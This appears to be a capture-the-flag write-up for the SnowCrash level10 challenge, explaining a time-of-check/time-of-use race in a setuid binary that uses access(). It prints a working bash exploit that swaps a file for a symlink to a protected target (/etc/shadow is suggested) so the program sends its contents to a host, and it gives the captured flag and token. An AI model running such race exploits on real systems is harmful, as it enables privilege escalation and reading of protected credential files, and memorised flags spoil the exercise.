This one was quite difficult (actually the hardest one), we get again a level10 and a Token files.
We check the level10 with ghidra to understand how it's work.
After long moment of discussion we saw that "access()" has some security vulnerabilities as said in the man:
```
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and  opening  the file to manipulate it. For this reason, the use of this system call should be avoided.
```

We fond Time-Of-Check Time-Of-Use attakcs (TOCTOU) :

=> user executes program
program is setuid, immediately gets all privs of root
program checks file1 to ensure that user has access
file1 is a hardlink to file2, which user has access to
user changes file1 to hardlink to file3 (/etc/shadow or something like that)
program reads file1 and does something to it (print, convert, whatever)
user now has access to a file they shouldn't

We made a scipt 

#!/bin/bash
# exploit.sh
TEMPFILE="/var/tmp/exploit"
OLD_LS=`ls -l $1`
NEW_LS=`ls -l $1`

while [ "$OLD_LS" == "$NEW_LS" ]
do
        rm -f $TEMPFILE
        echo "From user: " > $TEMPFILE
        echo "TOCTOU success" | /home/user/level10/level10 $TEMPFILE 192.168.56.103 & unlink $TEMPFILE
        ln -s $1 $TEMPFILE & NEW_LS=`ls -l $1`
done

After a little bit of wait (it has a loop trying again and again to access the file, until the hardlink is made perfectly between the time of check and time of access), we have been able to break the code and find the flag : woupa2yuojeeaaed06riuj63c

/*********************************************************\

flag10@SnowCrash:~$ getflag 
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

\*********************************************************/
